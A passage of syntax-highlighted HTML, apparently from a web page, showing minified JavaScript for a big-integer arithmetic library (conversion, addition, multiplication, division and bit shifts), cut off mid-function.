class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biFromDecimal</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> d, e, f, b = <span class="string">&quot;-&quot;</span> == a.<span class="title function_">charAt</span>(<span class="number">0</span>), c = b ? <span class="number">1</span> : <span class="number">0</span>; c &lt; a.<span class="property">length</span> &amp;&amp; <span class="string">&quot;0&quot;</span> == a.<span class="title function_">charAt</span>(c);)</span><br><span class="line">        ++c;</span><br><span class="line">    <span class="keyword">if</span> (c == a.<span class="property">length</span>)</span><br><span class="line">        d = <span class="keyword">new</span> <span class="title class_">BigInt</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (e = a.<span class="property">length</span> - c,</span><br><span class="line">                 f = e % dpl10,</span><br><span class="line">             <span class="number">0</span> == f &amp;&amp; (f = dpl10),</span><br><span class="line">                 d = <span class="title function_">biFromNumber</span>(<span class="title class_">Number</span>(a.<span class="title function_">substr</span>(c, f))),</span><br><span class="line">                 c += f; c &lt; a.<span class="property">length</span>;)</span><br><span class="line">            d = <span class="title function_">biAdd</span>(<span class="title function_">biMultiply</span>(d, lr10), <span class="title function_">biFromNumber</span>(<span class="title class_">Number</span>(a.<span class="title function_">substr</span>(c, dpl10)))),</span><br><span class="line">                c += dpl10;</span><br><span class="line">        d.<span class="property">isNeg</span> = b</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biCopy</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title class_">BigInt</span>(!<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> b.<span class="property">digits</span> = a.<span class="property">digits</span>.<span class="title function_">slice</span>(<span class="number">0</span>),</span><br><span class="line">        b.<span class="property">isNeg</span> = a.<span class="property">isNeg</span>,</span><br><span class="line">        b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biFromNumber</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c, b = <span class="keyword">new</span> <span class="title class_">BigInt</span>;</span><br><span class="line">    <span class="keyword">for</span> (b.<span class="property">isNeg</span> = <span class="number">0</span> &gt; a,</span><br><span class="line">             a = <span class="title class_">Math</span>.<span class="title function_">abs</span>(a),</span><br><span class="line">             c = <span class="number">0</span>; a &gt; <span class="number">0</span>;)</span><br><span class="line">        b.<span class="property">digits</span>[c++] = a &amp; maxDigitVal,</span><br><span class="line">            a &gt;&gt;= biRadixBits;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">reverseStr</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c, b = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (c = a.<span class="property">length</span> - <span class="number">1</span>; c &gt; -<span class="number">1</span>; --c)</span><br><span class="line">        b += a.<span class="title function_">charAt</span>(c);</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biToString</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> d, e, c = <span class="keyword">new</span> <span class="title class_">BigInt</span>;</span><br><span class="line">    <span class="keyword">for</span> (c.<span class="property">digits</span>[<span class="number">0</span>] = b,</span><br><span class="line">             d = <span class="title function_">biDivideModulo</span>(a, c),</span><br><span class="line">             e = hexatrigesimalToChar[d[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>]]; <span class="number">1</span> == <span class="title function_">biCompare</span>(d[<span class="number">0</span>], bigZero);)</span><br><span class="line">        d = <span class="title function_">biDivideModulo</span>(d[<span class="number">0</span>], c),</span><br><span class="line">            digit = d[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>],</span><br><span class="line">            e += hexatrigesimalToChar[d[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>]];</span><br><span class="line">    <span class="keyword">return</span> (a.<span class="property">isNeg</span> ? <span class="string">&quot;-&quot;</span> : <span class="string">&quot;&quot;</span>) + <span class="title function_">reverseStr</span>(e)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biToDecimal</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c, d, b = <span class="keyword">new</span> <span class="title class_">BigInt</span>;</span><br><span class="line">    <span class="keyword">for</span> (b.<span class="property">digits</span>[<span class="number">0</span>] = <span class="number">10</span>,</span><br><span class="line">             c = <span class="title function_">biDivideModulo</span>(a, b),</span><br><span class="line">             d = <span class="title class_">String</span>(c[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>]); <span class="number">1</span> == <span class="title function_">biCompare</span>(c[<span class="number">0</span>], bigZero);)</span><br><span class="line">        c = <span class="title function_">biDivideModulo</span>(c[<span class="number">0</span>], b),</span><br><span class="line">            d += <span class="title class_">String</span>(c[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> (a.<span class="property">isNeg</span> ? <span class="string">&quot;-&quot;</span> : <span class="string">&quot;&quot;</span>) + <span class="title function_">reverseStr</span>(d)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">digitToHex</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="number">15</span></span><br><span class="line">        , c = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; <span class="number">4</span> &gt; i; ++i)</span><br><span class="line">        c += hexToChar[a &amp; b],</span><br><span class="line">            a &gt;&gt;&gt;= <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">reverseStr</span>(c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biToHex</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> d, b = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="title function_">biHighIndex</span>(a),</span><br><span class="line">             d = <span class="title function_">biHighIndex</span>(a); d &gt; -<span class="number">1</span>; --d)</span><br><span class="line">        b += <span class="title function_">digitToHex</span>(a.<span class="property">digits</span>[d]);</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">charToHex</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> h, b = <span class="number">48</span>, c = b + <span class="number">9</span>, d = <span class="number">97</span>, e = d + <span class="number">25</span>, f = <span class="number">65</span>, g = <span class="number">90</span>;</span><br><span class="line">    <span class="keyword">return</span> h = a &gt;= b &amp;&amp; c &gt;= a ? a - b : a &gt;= f &amp;&amp; g &gt;= a ? <span class="number">10</span> + a - f : a &gt;= d &amp;&amp; e &gt;= a ? <span class="number">10</span> + a - d : <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToDigit</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> d, b = <span class="number">0</span>, c = <span class="title class_">Math</span>.<span class="title function_">min</span>(a.<span class="property">length</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span> (d = <span class="number">0</span>; c &gt; d; ++d)</span><br><span class="line">        b &lt;&lt;= <span class="number">4</span>,</span><br><span class="line">            b |= <span class="title function_">charToHex</span>(a.<span class="title function_">charCodeAt</span>(d));</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biFromHex</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> d, e, b = <span class="keyword">new</span> <span class="title class_">BigInt</span>, c = a.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span> (d = c,</span><br><span class="line">             e = <span class="number">0</span>; d &gt; <span class="number">0</span>; d -= <span class="number">4</span>,</span><br><span class="line">             ++e)</span><br><span class="line">        b.<span class="property">digits</span>[e] = <span class="title function_">hexToDigit</span>(a.<span class="title function_">substr</span>(<span class="title class_">Math</span>.<span class="title function_">max</span>(d - <span class="number">4</span>, <span class="number">0</span>), <span class="title class_">Math</span>.<span class="title function_">min</span>(d, <span class="number">4</span>)));</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biFromString</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> g, h, i, j, c = <span class="string">&quot;-&quot;</span> == a.<span class="title function_">charAt</span>(<span class="number">0</span>), d = c ? <span class="number">1</span> : <span class="number">0</span>, e = <span class="keyword">new</span> <span class="title class_">BigInt</span>, f = <span class="keyword">new</span> <span class="title class_">BigInt</span>;</span><br><span class="line">    <span class="keyword">for</span> (f.<span class="property">digits</span>[<span class="number">0</span>] = <span class="number">1</span>,</span><br><span class="line">             g = a.<span class="property">length</span> - <span class="number">1</span>; g &gt;= d; g--)</span><br><span class="line">        h = a.<span class="title function_">charCodeAt</span>(g),</span><br><span class="line">            i = <span class="title function_">charToHex</span>(h),</span><br><span class="line">            j = <span class="title function_">biMultiplyDigit</span>(f, i),</span><br><span class="line">            e = <span class="title function_">biAdd</span>(e, j),</span><br><span class="line">            f = <span class="title function_">biMultiplyDigit</span>(f, b);</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">isNeg</span> = c,</span><br><span class="line">        e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biDump</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (a.<span class="property">isNeg</span> ? <span class="string">&quot;-&quot;</span> : <span class="string">&quot;&quot;</span>) + a.<span class="property">digits</span>.<span class="title function_">join</span>(<span class="string">&quot; &quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biAdd</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c, d, e, f;</span><br><span class="line">    <span class="keyword">if</span> (a.<span class="property">isNeg</span> != b.<span class="property">isNeg</span>)</span><br><span class="line">        b.<span class="property">isNeg</span> = !b.<span class="property">isNeg</span>,</span><br><span class="line">            c = <span class="title function_">biSubtract</span>(a, b),</span><br><span class="line">            b.<span class="property">isNeg</span> = !b.<span class="property">isNeg</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (c = <span class="keyword">new</span> <span class="title class_">BigInt</span>,</span><br><span class="line">                 d = <span class="number">0</span>,</span><br><span class="line">                 f = <span class="number">0</span>; f &lt; a.<span class="property">digits</span>.<span class="property">length</span>; ++f)</span><br><span class="line">            e = a.<span class="property">digits</span>[f] + b.<span class="property">digits</span>[f] + d,</span><br><span class="line">                c.<span class="property">digits</span>[f] = <span class="number">65535</span> &amp; e,</span><br><span class="line">                d = <span class="title class_">Number</span>(e &gt;= biRadix);</span><br><span class="line">        c.<span class="property">isNeg</span> = a.<span class="property">isNeg</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biSubtract</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c, d, e, f;</span><br><span class="line">    <span class="keyword">if</span> (a.<span class="property">isNeg</span> != b.<span class="property">isNeg</span>)</span><br><span class="line">        b.<span class="property">isNeg</span> = !b.<span class="property">isNeg</span>,</span><br><span class="line">            c = <span class="title function_">biAdd</span>(a, b),</span><br><span class="line">            b.<span class="property">isNeg</span> = !b.<span class="property">isNeg</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (c = <span class="keyword">new</span> <span class="title class_">BigInt</span>,</span><br><span class="line">                 e = <span class="number">0</span>,</span><br><span class="line">                 f = <span class="number">0</span>; f &lt; a.<span class="property">digits</span>.<span class="property">length</span>; ++f)</span><br><span class="line">            d = a.<span class="property">digits</span>[f] - b.<span class="property">digits</span>[f] + e,</span><br><span class="line">                c.<span class="property">digits</span>[f] = <span class="number">65535</span> &amp; d,</span><br><span class="line">            c.<span class="property">digits</span>[f] &lt; <span class="number">0</span> &amp;&amp; (c.<span class="property">digits</span>[f] += biRadix),</span><br><span class="line">                e = <span class="number">0</span> - <span class="title class_">Number</span>(<span class="number">0</span> &gt; d);</span><br><span class="line">        <span class="keyword">if</span> (-<span class="number">1</span> == e) &#123;</span><br><span class="line">            <span class="keyword">for</span> (e = <span class="number">0</span>,</span><br><span class="line">                     f = <span class="number">0</span>; f &lt; a.<span class="property">digits</span>.<span class="property">length</span>; ++f)</span><br><span class="line">                d = <span class="number">0</span> - c.<span class="property">digits</span>[f] + e,</span><br><span class="line">                    c.<span class="property">digits</span>[f] = <span class="number">65535</span> &amp; d,</span><br><span class="line">                c.<span class="property">digits</span>[f] &lt; <span class="number">0</span> &amp;&amp; (c.<span class="property">digits</span>[f] += biRadix),</span><br><span class="line">                    e = <span class="number">0</span> - <span class="title class_">Number</span>(<span class="number">0</span> &gt; d);</span><br><span class="line">            c.<span class="property">isNeg</span> = !a.<span class="property">isNeg</span></span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            c.<span class="property">isNeg</span> = a.<span class="property">isNeg</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biHighIndex</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> b = a.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>; b &gt; <span class="number">0</span> &amp;&amp; <span class="number">0</span> == a.<span class="property">digits</span>[b];)</span><br><span class="line">        --b;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biNumBits</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e, b = <span class="title function_">biHighIndex</span>(a), c = a.<span class="property">digits</span>[b], d = (b + <span class="number">1</span>) * bitsPerDigit;</span><br><span class="line">    <span class="keyword">for</span> (e = d; e &gt; d - bitsPerDigit &amp;&amp; <span class="number">0</span> == (<span class="number">32768</span> &amp; c); --e)</span><br><span class="line">        c &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biMultiply</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> d, h, i, k, c = <span class="keyword">new</span> <span class="title class_">BigInt</span>, e = <span class="title function_">biHighIndex</span>(a), f = <span class="title function_">biHighIndex</span>(b);</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; f &gt;= k; ++k) &#123;</span><br><span class="line">        <span class="keyword">for</span> (d = <span class="number">0</span>,</span><br><span class="line">                 i = k,</span><br><span class="line">                 j = <span class="number">0</span>; e &gt;= j; ++j,</span><br><span class="line">                 ++i)</span><br><span class="line">            h = c.<span class="property">digits</span>[i] + a.<span class="property">digits</span>[j] * b.<span class="property">digits</span>[k] + d,</span><br><span class="line">                c.<span class="property">digits</span>[i] = h &amp; maxDigitVal,</span><br><span class="line">                d = h &gt;&gt;&gt; biRadixBits;</span><br><span class="line">        c.<span class="property">digits</span>[k + e + <span class="number">1</span>] = d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c.<span class="property">isNeg</span> = a.<span class="property">isNeg</span> != b.<span class="property">isNeg</span>,</span><br><span class="line">        c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biMultiplyDigit</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c, d, e, f;</span><br><span class="line">    <span class="keyword">for</span> (result = <span class="keyword">new</span> <span class="title class_">BigInt</span>,</span><br><span class="line">             c = <span class="title function_">biHighIndex</span>(a),</span><br><span class="line">             d = <span class="number">0</span>,</span><br><span class="line">             f = <span class="number">0</span>; c &gt;= f; ++f)</span><br><span class="line">        e = result.<span class="property">digits</span>[f] + a.<span class="property">digits</span>[f] * b + d,</span><br><span class="line">            result.<span class="property">digits</span>[f] = e &amp; maxDigitVal,</span><br><span class="line">            d = e &gt;&gt;&gt; biRadixBits;</span><br><span class="line">    <span class="keyword">return</span> result.<span class="property">digits</span>[<span class="number">1</span> + c] = d,</span><br><span class="line">        result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arrayCopy</span>(<span class="params">a, b, c, d, e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> g, h, f = <span class="title class_">Math</span>.<span class="title function_">min</span>(b + e, a.<span class="property">length</span>);</span><br><span class="line">    <span class="keyword">for</span> (g = b,</span><br><span class="line">             h = d; f &gt; g; ++g,</span><br><span class="line">             ++h)</span><br><span class="line">        c[h] = a[g]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biShiftLeft</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e, f, g, h, c = <span class="title class_">Math</span>.<span class="title function_">floor</span>(b / bitsPerDigit), d = <span class="keyword">new</span> <span class="title class_">BigInt</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="title function_">arrayCopy</span>(a.<span class="property">digits</span>, <span class="number">0</span>, d.<span class="property">digits</span>, c, d.<span class="property">digits</span>.<span class="property">length</span> - c),</span><br><span class="line">             e = b % bitsPerDigit,</span><br><span class="line">             f = bitsPerDigit - e,</span><br><span class="line">             g = d.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>,</span><br><span class="line">             h = g - <span class="number">1</span>; g &gt; <span class="number">0</span>; --g,</span><br><span class="line">             --h)</span><br><span class="line">        d.<span class="property">digits</span>[g] = d.<span class="property">digits</span>[g] &lt;&lt; e &amp; maxDigitVal | (d.<span class="property">digits</span>[h] &amp; highBitMasks[e]) &gt;&gt;&gt; f;</span><br><span class="line">    <span class="keyword">return</span> d.<span class="property">digits</span>[<span class="number">0</span>] = d.<span class="property">digits</span>[g] &lt;&lt; e &amp; maxDigitVal,</span><br><span class="line">        d.<span class="property">isNeg</span> = a.<span class="property">isNeg</span>,</span><br><span class="line">        d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biShiftRight</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e, f, g, h, c = <span class="title class_">Math</span>.<span class="title function_">floor</span>(b / bitsPerDigit), d = <span class="keyword">new</span> <span class="title class_">BigInt</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="title function_">arrayCopy</span>(a.<span class="property">digits</span>, c, d.<span class="property">digits</span>, <span class="number">0</span>, a.<span class="property">digits</span>.<span class="property">length</span> - c),</span><br><span class="line">             e = b % bitsPerDigit,</span><br><span class="line">             f = bitsPerDigit - e,</span><br><span class="line">             g = <span class="number">0</span>,</span><br><span class="line">             h = g + <span class="number">1</span>; g &lt; d.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>; ++g,</span><br><span class="line">             ++h)</span><br><span class="line">        d.<span class="property">digits</span>[g] = d.<span class="property">digits</span>[g] &gt;&gt;&gt; e | (d.<span class="property">digits</span>[h] &amp; lowBitMasks[e]) &lt;&lt; f;</span><br><span class="line">    <span class="keyword">return</span> d.<span class="property">digits</span>[d.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>] &gt;&gt;&gt;= e,</span><br><span class="line">        d.<span class="property">isNeg</span> = a.<span class="property">isNeg</span>,</span><br><span class="line">        d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biMultiplyByRadixPower</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title class_">BigInt</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">arrayCopy</span>(a.<span class="property">digits</span>, <span class="number">0</span>, c.<span class="property">digits</span>, b, c.<span class="property">digits</span>.<span class="property">length</span> - b),</span><br><span class="line">        c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biDivideByRadixPower</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title class_">BigInt</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">arrayCopy</span>(a.<span class="property">digits</span>, b, c.<span class="property">digits</span>, <span class="number">0</span>, c.<span class="property">digits</span>.<span class="property">length</span> - b),</span><br><span class="line">        c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biModuloByRadixPower</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title class_">BigInt</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">arrayCopy</span>(a.<span class="property">digits</span>, <span class="number">0</span>, c.<span class="property">digits</span>, <span class="number">0</span>, b),</span><br><span class="line">        c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biCompare</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a.<span class="property">isNeg</span> != b.<span class="property">isNeg</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> - <span class="number">2</span> * <span class="title class_">Number</span>(a.<span class="property">isNeg</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = a.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>; c &gt;= <span class="number">0</span>; --c)</span><br><span class="line">        <span class="keyword">if</span> (a.<span class="property">digits</span>[c] != b.<span class="property">digits</span>[c])</span><br><span class="line">            <span class="keyword">return</span> a.<span class="property">isNeg</span> ? <span class="number">1</span> - <span class="number">2</span> * <span class="title class_">Number</span>(a.<span class="property">digits</span>[c] &gt; b.<span class="property">digits</span>[c]) : <span class="number">1</span> - <span class="number">2</span> * <span class="title class_">Number</span>(a.<span class="property">digits</span>[c] &lt; b.<span class="property">digits</span>[c]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biDivideModulo</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> f, g, h, i, j, k, l, m, n, o, p, q, r, s, c = <span class="title function_">biNumBits</span>(a), d = <span class="title function_">biNumBits</span>(b), e = b.<span class="property">isNeg</span>;</span><br><span class="line">    <span class="keyword">if</span> (d &gt; c)</span><br><span class="line">        <span class="keyword">return</span> a.<span class="property">isNeg</span> ? (f = <span class="title function_">biCopy</span>(bigOne),</span><br><span class="line">            f.<span class="property">isNeg</span> = !b.<span class="property">isNeg</span>,</span><br><span class="line">            a.<span class="property">isNeg</span> = !<span class="number">1</span>,</span><br><span class="line">            b.<span class="property">isNeg</span> = !<span class="number">1</span>,</span><br><span class="line">            g = <span class="title function_">biSubtract</span>(b, a),</span><br><span class="line">            a.<span class="property">isNeg</span> = !<span class="number">0</span>,</span><br><span class="line">            b.<span class="property">isNeg</span> = e) : (f = <span class="keyword">new</span> <span class="title class_">BigInt</span>,</span><br><span class="line">            g = <span class="title function_">biCopy</span>(a)),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Array</span>(f, g);</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="keyword">new</span> <span class="title class_">BigInt</span>,</span><br><span class="line">             g = a,</span><br><span class="line">             h = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(d / bitsPerDigit) - <span class="number">1</span>,</span><br><span class="line">             i = <span class="number">0</span>; b.<span class="property">digits</span>[h] &lt; biHalfRadix;)</span><br><span class="line">        b = <span class="title function_">biShiftLeft</span>(b, <span class="number">1</span>),</span><br><span class="line">            ++i,</span><br><span class="line">            ++d,</span><br><span class="line">            h = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(d / bitsPerDigit) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (g = <span class="title function_">biShiftLeft</span>(g, i),</span><br><span class="line">             c += i,</span><br><span class="line">             j = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(c / bitsPerDigit) - <span class="number">1</span>,</span><br><span class="line">             k = <span class="title function_">biMultiplyByRadixPower</span>(b, j - h); -<span class="number">1</span> != <span class="title function_">biCompare</span>(g, k);)</span><br><span class="line">        ++f.<span class="property">digits</span>[j - h],</span><br><span class="line">            g = <span class="title function_">biSubtract</span>(g, k);</span><br><span class="line">    <span class="keyword">for</span> (l = j; l &gt; h; --l) &#123;</span><br><span class="line">        <span class="keyword">for</span> (m = l &gt;= g.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : g.<span class="property">digits</span>[l],</span><br><span class="line">                 n = l - <span class="number">1</span> &gt;= g.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : g.<span class="property">digits</span>[l - <span class="number">1</span>],</span><br><span class="line">                 o = l - <span class="number">2</span> &gt;= g.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : g.<span class="property">digits</span>[l - <span class="number">2</span>],</span><br><span class="line">                 p = h &gt;= b.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : b.<span class="property">digits</span>[h],</span><br><span class="line">                 q = h - <span class="number">1</span> &gt;= b.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : b.<span class="property">digits</span>[h - <span class="number">1</span>],</span><br><span class="line">                 f.<span class="property">digits</span>[l - h - <span class="number">1</span>] = m == p ? maxDigitVal : <span class="title class_">Math</span>.<span class="title function_">floor</span>((m * biRadix + n) / p),</span><br><span class="line">                 r = f.<span class="property">digits</span>[l - h - <span class="number">1</span>] * (p * biRadix + q),</span><br><span class="line">                 s = m * biRadixSquared + (n * biRadix + o); r &gt; s;)</span><br><span class="line">            --f.<span class="property">digits</span>[l - h - <span class="number">1</span>],</span><br><span class="line">                r = f.<span class="property">digits</span>[l - h - <span class="number">1</span>] * (p * biRadix | q),</span><br><span class="line">                s = m * biRadix * biRadix + (n * biRadix + o);</span><br><span class="line">        k = <span class="title function_">biMultiplyByRadixPower</span>(b, l - h - <span class="number">1</span>),</span><br><span class="line">            g = <span class="title function_">biSubtract</span>(g, <span class="title function_">biMultiplyDigit</span>(k, f.<span class="property">digits</span>[l - h - <span class="number">1</span>])),</span><br><span class="line">        g.<span class="property">isNeg</span> &amp;&amp; (g = <span class="title function_">biAdd</span>(g, k),</span><br><span class="line">            --f.<span class="property">digits</span>[l - h - <span class="number">1</span>])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> g = <span class="title function_">biShiftRight</span>(g, i),</span><br><span class="line">        f.<span class="property">isNeg</span> = a.<span class="property">isNeg</span> != e,</span><br><span class="line">    a.<span class="property">isNeg</span> &amp;&amp; (f = e ? <span class="title function_">biAdd</span>(f, bigOne) : <span class="title function_">biSubtract</span>(f, bigOne),</span><br><span class="line">        b = <span class="title function_">biShiftRight</span>(b, i),</span><br><span class="line">        g = <span class="title function_">biSubtract</span>(b, g)),</span><br><span class="line">    <span class="number">0</span> == g.<span class="property">digits</span>[<span class="number">0</span>] &amp;&amp; <span class="number">0</span> == <span class="title function_">biHighIndex</span>(g) &amp;&amp; (g.<span class="property">isNeg</span> = !<span class="number">1</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(f, g)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biDivide</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">biDivideModulo</span>(a, b)[<span class="number">0</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biModulo</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">biDivideModulo</span>(a, b)[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biMultiplyMod</span>(<span class="params">a, b, c</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">biModulo</span>(<span class="title function_">biMultiply</span>(a, b), c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biPow</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = bigOne, d = a; ;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != (<span 